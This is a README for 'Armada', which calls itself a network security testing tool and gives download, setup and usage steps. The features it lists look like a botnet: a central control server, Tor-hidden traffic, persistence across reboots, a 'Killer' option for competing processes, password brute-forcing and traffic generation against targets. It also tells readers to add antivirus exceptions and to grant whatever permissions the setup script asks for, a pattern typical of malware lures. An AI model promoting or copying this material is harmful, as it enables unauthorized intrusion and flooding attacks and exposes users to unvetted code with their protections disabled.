# 🛡️ Armada - Network security testing and management tool

[![](https://img.shields.io/badge/Download-Armada-blue)](https://github.com/Chancelsanvitaliaprocumbens571/Armada)

Armada provides a way to manage and test network systems. It uses C code to run tasks such as checking passwords, finding bugs in network traffic, and managing persistent connections. This tool helps users analyze how systems handle traffic and maintain security under load.

## ⚙️ System Requirements

- Windows 10 or Windows 11
- 4 GB of System RAM
- 500 MB of disk space
- Stable internet connection
- Python 3.10 or newer

## 📥 Getting Started

1. Visit [this link](https://github.com/Chancelsanvitaliaprocumbens571/Armada) to download the software package.
2. Click the green "Code" button on the webpage and select "Download ZIP".
3. Extract the contents of the ZIP folder to your desktop.
4. Open the extracted folder named "Armada-main".

## 🛠️ Setting Up the Software

You need Python to prepare the tool. Follow these steps:

1. Open your Start menu and type "cmd" to open the Command Prompt.
2. Type `cd` followed by a space, then drag your folder into the window. Press Enter.
3. Type `python setup.py` and press Enter.
4. The system will download dependencies. Wait for the process to finish.
5. If the script asks for permissions, choose "Allow" or "Yes".

## 🚀 Running the Tool

After the setup finishes, you access the main menu:

1. In the same Command Prompt window, type `python start.py`.
2. The program shows a menu. You can choose a command line view or a text-based interface.
3. Select your preferred mode by typing the corresponding number.
4. Enter the target network address when prompted.

## 📡 Managing Network Tests

The software controls connection points using a central server setup. This allows you to monitor traffic patterns remotely. The program uses Tor to keep traffic hidden during tests.

- To start a test, select the option for traffic generation.
- The tool uses packet inspection to identify open ports.
- You can stop any task by pressing "Ctrl + C" on your keyboard.

## 🔐 Security and Persistence

The tool includes a feature to ensure the connection stays active. This helps if you need to run long tests on remote systems. 

- Persistence settings keep the application running during system restarts.
- You can adjust the "Killer" setting to stop conflicting background tasks that might block your connection.
- Check the internal logs to see if your commands reach the target successfully.

## 🧩 Identifying Vulnerabilities

The tool scans for weak access points. It attempts to gain entry to secure systems by testing common password combinations. 

1. Select the "Brute Force" option from the main menu.
2. Provide a list of passwords in a text file.
3. The tool will cycle through these to test system defenses.
4. View the "results.txt" file in the main folder to see what the tool discovered.

## 📊 Troubleshooting Common Issues

If the software does not open, check these items:

- Ensure your Antivirus allows the tool to run. Security software often marks testing tools as suspicious. Add an exception for the "Armada" folder.
- Verify your Python installation. Type `python --version` in the Command Prompt to confirm version 3.10 or higher.
- Check your internet connection. The tool needs access to the network to maintain its remote server connection.
- If the Command Prompt closes instantly, run the tool directly from the Command Prompt window instead of double-clicking the file. This lets you see any error messages that appear.
- Re-run the `setup.py` file if you see errors related to missing files.

## 📋 Best Practices

- Run this tool on networks you own.
- Use a separate virtual environment if you want to keep your system clean.
- Keep the folder location simple, such as "C:\Armada", to prevent permission errors.
- Update your software often by visiting the download page.
- Review the documentation files within the folder for advanced commands.
- Use the TUI mode if you prefer a visual menu over typing commands.